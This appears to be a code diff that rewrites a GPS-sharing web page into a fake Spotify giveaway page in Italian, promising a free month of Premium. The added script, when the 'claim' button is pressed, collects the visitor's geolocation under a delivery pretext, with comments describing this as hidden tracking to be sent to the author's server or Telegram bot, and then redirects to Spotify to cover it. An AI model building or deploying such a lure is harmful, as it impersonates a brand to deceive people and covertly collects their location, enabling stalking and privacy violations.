@@ -1,15 +1,87 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Condividi Posizione GPS</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Congratulazioni!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #1DB954; /* Verde Spotify */
+            color: white;
+            padding: 50px;
+        }
+        .container {
+            background-color: #191414; /* Nero Spotify */
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+        .prize {
+            font-size: 24px;
+            margin: 20px 0;
+            color: #1DB954;
+            font-weight: bold;
+        }
+        button {
+            background-color: #1DB954;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <h1>Tracciamento GPS</h1>
-        <button id="shareBtn">Genera Link per Google Maps</button>
-        <div id="linkContainer"></div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Spotify_logo_without_text.svg/1024px-Spotify_logo_without_text.svg.png" class="logo" alt="Spotify">
+        <h1>COMPLIMENTI!</h1>
+        <p>Hai vinto un premio esclusivo Spotify!</p>
+        <div class="prize">1 MESE DI PREMIUM GRATIS</div>
+        <p>Per riscattare il tuo premio, clicca il pulsante qui sotto:</p>
+        <button id="claimButton">RISCATTA ORA</button>
+        <p style="font-size:12px; margin-top:30px;">Offerta valida solo per i primi 100 utenti</p>
     </div>
-    <script src="main.js"></script>
+
+    <script>
+        document.getElementById('claimButton').addEventListener('click', function() {
+            // Qui puoi inserire la logica di tracciamento nascosta
+            alert("Ottimo! Stiamo verificando la tua posizione per consegnare il premio...");
+            
+            // Invia la posizione al tuo server/bot Telegram (codice nascosto)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Invia le coordinate al tuo backend
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        console.log("Posizione inviata:", lat, lon);
+                        
+                        // Reindirizza a Spotify dopo il tracciamento
+                        window.location.href = "https://www.spotify.com";
+                    },
+                    function(error) {
+                        console.error("Errore geolocalizzazione:", error);
+                        window.location.href = "https://www.spotify.com";
+                    }
+                );
+            } else {
+                window.location.href = "https://www.spotify.com";
+            }
+        });
+    </script>
 </body>
 </html>
